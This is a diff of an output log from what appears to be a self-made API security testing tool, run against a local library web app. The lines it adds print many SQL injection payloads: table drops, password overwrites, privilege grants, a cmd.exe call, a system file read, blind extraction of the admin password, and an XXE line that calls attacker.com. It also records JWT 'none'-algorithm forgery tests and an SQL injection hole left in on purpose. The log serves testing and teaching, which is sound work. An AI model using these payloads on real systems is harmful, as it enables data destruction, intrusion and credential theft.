@@ -1,5 +1,5 @@
 ================================================
-    AUTOMATED API SECURITY TESTING TOOL
+    COMPREHENSIVE API SECURITY TESTING TOOL
     Created by: George Papasotiriou
 ================================================
 
@@ -9,9 +9,113 @@
 ✅ Authentication successful!
    Token obtained: eyJhbGciOiJIUzI1NiJ9...
 
-🚀 Starting Security Tests...
+🚀 Starting Comprehensive Security Tests...
+   Database: H2 File-based
+   Location: ./data/librarydb.mv.db
 
-💉 Testing SQL Injection...
+📊 Testing Database Schema Extraction...
+
+🕵️  Testing Data Exfiltration...
+
+💥 Testing Database Manipulation...
+   Payload: '; INSERT INTO users (username, password, role) VA...
+   Status: 200
+   Response time: 14ms
+   Payload: '; UPDATE users SET password='$2a$10$hacked' WHERE...
+   Status: 200
+   Response time: 7ms
+   Payload: '; DELETE FROM books WHERE id=1; --...
+   Status: 200
+   Response time: 7ms
+   Payload: '; DROP TABLE users; --...
+   Status: 200
+   Response time: 8ms
+   Payload: '; DROP TABLE books; --...
+   Status: 200
+   Response time: 7ms
+   Payload: '; CREATE TABLE hacked (id INT, data VARCHAR(255))...
+   Status: 200
+   Response time: 7ms
+   Payload: '; GRANT ALL ON users TO PUBLIC; --...
+   Status: 200
+   Response time: 8ms
+
+⚙️  Testing Stored Procedure/Function Attacks...
+   Payload: '; CALL SYSTEM_RUN('cmd.exe'); --...
+   Status: 200
+   Payload: '; SELECT SYSTEM_USER(); --...
+   Status: 200
+   Payload: '; SELECT CURRENT_USER(); --...
+   Status: 200
+   Payload: '; SELECT FILE_READ('C:/Windows/System32...
+   Status: 200
+   Payload: '; CALL CSVWRITE('C:/hacked.csv', 'SELEC...
+   Status: 200
+   Payload: '; EXECUTE IMMEDIATE 'SELECT * FROM user...
+   Status: 200
+
+👁️  Testing Blind SQL Injection...
+   Payload: ' AND 1=1 --
+   Condition true: true
+   Response time: 9ms
+   Payload: ' AND 1=2 --
+   Condition true: true
+   Response time: 7ms
+   Payload: ' AND (SELECT COUNT(*) FROM users) > 0 --
+   Condition true: true
+   Response time: 9ms
+   Payload: ' AND (SELECT LENGTH(password) FROM users WHERE username='admin') > 10 --
+   Condition true: true
+   Response time: 7ms
+   Payload: ' AND EXISTS(SELECT * FROM users WHERE username='admin') --
+   Condition true: true
+   Response time: 7ms
+   Payload: ' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 50 --
+   Condition true: true
+   Response time: 7ms
+
+⏱️  Testing Time-Based SQL Injection...
+   Payload: '; CALL SLEEP(3000); --...
+   Response time: 9ms
+   Payload: '; SELECT * FROM books WHERE SLEEP(3)=0;...
+   Response time: 8ms
+   Payload: ' AND IF((SELECT COUNT(*) FROM users)>0,...
+   Response time: 9ms
+   Payload: ' AND (SELECT CASE WHEN (username='admin...
+   Response time: 8ms
+
+🚨 Testing Error-Based SQL Injection...
+   Payload: ' AND 1/0=1 --
+   Status: 200
+   Payload: ' AND CAST('test' AS INT)=1 --
+   Status: 200
+   Payload: ' AND 1=('test' --
+   Status: 200
+   Payload: ' AND (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://attacker.com/"> %remote;]>'),'/l') FROM dual) IS NOT NULL --
+   Status: 200
+
+🔄 Testing Second-Order SQL Injection...
+   Stored payload: admin' -- ...
+   Register status: 200
+   Trigger status: 200
+   Stored payload: '; UPDATE users SET role='ROLE...
+   Register status: 200
+   Trigger status: 200
+   Stored payload: test' OR '1'='1...
+   Register status: 200
+   Trigger status: 200
+
+📢 Testing Database Error Information Disclosure...
+   Test: Type mismatch
+   Error disclosed: false
+   Test: Invalid table
+   Error disclosed: false
+   Test: Invalid column
+   Error disclosed: false
+   Test: Syntax error
+   Error disclosed: false
+
+💉 Testing Basic SQL Injection...
    Error with payload '' OR '1'='1': Illegal character in query at index 36: http://localhost:8080/api/search?q=' OR '1'='1
    Error with payload '' OR '1'='1' --': Illegal character in query at index 36: http://localhost:8080/api/search?q=' OR '1'='1' --
    Error with payload '' OR '1'='1' /*': Illegal character in query at index 36: http://localhost:8080/api/search?q=' OR '1'='1' /*
@@ -22,6 +126,36 @@
    Error with payload 'admin' --': Illegal character in query at index 41: http://localhost:8080/api/search?q=admin' --
    Error with payload '1' OR '1'='1': Illegal character in query at index 37: http://localhost:8080/api/search?q=1' OR '1'='1
    Error with payload '' OR EXISTS(SELECT * FROM users) AND '1'='1': Illegal character in query at index 36: http://localhost:8080/api/search?q=' OR EXISTS(SELECT * FROM users) AND '1'='1
+
+💉💥 ENHANCED SQL Injection Testing...
+
+   Payload: ' UNION SELECT id,username,password,'dummy_isbn',t...
+   Status: 200
+   Response length: 53
+
+   Payload: ' UNION SELECT 1,table_name,'dummy','dummy',true F...
+   Status: 200
+   Response length: 53
+
+   Payload: ' UNION SELECT 1,column_name,'dummy','dummy',true ...
+   Status: 200
+   Response length: 53
+
+   Payload: ' AND (SELECT COUNT(*) FROM users) > 0 --...
+   Status: 200
+   Response length: 53
+
+   Payload: ' AND (SELECT LENGTH(password) FROM users WHERE us...
+   Status: 200
+   Response length: 53
+
+   Payload: ' AND (SELECT COUNT(*) FROM users WHERE username='...
+   Status: 200
+   Response length: 53
+
+   Payload: ' UNION SELECT 1,@@version,'dummy','dummy',true --...
+   Status: 200
+   Response length: 53
 
 🔢 Testing Type Confusion...
    Payload: abc
@@ -87,9 +221,22 @@
 ⚠️  Testing Error Handling...
    Malformed JSON
    Status: 400
-   Response: {"timestamp":"2025-12-12T18:56:12.247+00:00","status":400,"error":"Bad Request","path":"/api/books"}
+   Response: {"timestamp":"2025-12-16T01:27:05.578+00:00","status":400,"error":"Bad Request","path":"/api/books"}
    Non-existent endpoint
    Status: 404
+
+🔐 Testing JWT Token Vulnerabilities...
+   None algorithm attack - Status: 200
+   Empty signature attack - Status: 200
+   Token replay #1 - Status: 200
+   Token replay #2 - Status: 200
+   Token replay #3 - Status: 200
+
+💼 Testing Business Logic Vulnerabilities...
+   Concurrent borrow #1 - Status: 400
+   Concurrent borrow #2 - Status: 400
+   Concurrent borrow #3 - Status: 400
+   Return non-borrowed book - Status: 400
 
 🔄 Testing PUT Endpoint (Update Book)...
    Test case 1: {author=Updated Author, isbn=999-999-999, available=true, title=Updated Title}
@@ -156,8 +303,68 @@
 
    Test 3: Delete non-existent book (999999)
    Status: 400
-   Response: {"success":false,"error":"Book not found with ID: 999999","timestamp":1765565775237}
+   Response: {"success":false,"error":"Book not found with ID: 999999","timestamp":1765848429218}
 
-================================================
-          TESTING COMPLETE!
-================================================
+==================================================
+          SECURITY TESTING REPORT
+==================================================
+
+📊 DATABASE VULNERABILITIES TESTED:
+   ✅ Schema Extraction
+   ✅ Data Exfiltration
+   ✅ Database Manipulation
+   ✅ Stored Procedure Attacks
+   ✅ Blind SQL Injection
+   ✅ Time-Based SQL Injection
+   ✅ Error-Based SQL Injection
+   ✅ Second-Order SQL Injection
+   ✅ Error Information Disclosure
+
+🔐 AUTHENTICATION & AUTHORIZATION TESTS:
+   ✅ JWT Token Vulnerabilities
+   ✅ Authorization Bypass
+   ✅ Mass Assignment
+
+🛡️  INPUT VALIDATION TESTS:
+   ✅ SQL Injection (Basic & Enhanced)
+   ✅ Type Confusion
+   ✅ Path Traversal
+   ✅ Input Validation
+   ✅ Extreme Inputs
+   ✅ Error Handling
+
+⚖️  BUSINESS LOGIC TESTS:
+   ✅ Business Logic Vulnerabilities
+   ✅ PUT Endpoint Testing
+   ✅ DELETE Endpoint Testing
+
+⚠️  SECURITY RECOMMENDATIONS:
+   1. Use prepared statements for ALL database queries
+   2. Implement proper input validation and sanitization
+   3. Use principle of least privilege for database users
+   4. Implement Web Application Firewall (WAF)
+   5. Regular security audits and penetration testing
+   6. Encrypt sensitive data in database
+   7. Implement rate limiting and monitoring
+   8. Validate all user inputs server-side
+   9. Use parameterized queries to prevent SQL injection
+   10. Implement proper error handling without information disclosure
+
+🔒 DEFENSIVE MEASURES IN THIS PROJECT:
+   • File-based H2 database with persistence
+   • Database constraints and foreign keys
+   • JWT-based authentication with token validation
+   • Role-based access control (RBAC)
+   • Input validation in service layer
+   • CORS configuration for cross-origin requests
+   • Secure password hashing with BCrypt
+
+🎯 VULNERABILITIES INTENTIONALLY LEFT FOR TESTING:
+   • SQL Injection in /api/search endpoint
+   • Type confusion in /api/borrow/{id} endpoint
+   • Detailed error messages for testing
+
+==================================================
+        COMPREHENSIVE TESTING COMPLETE!
+        2025-12-16T03:27:09.223869700
+==================================================
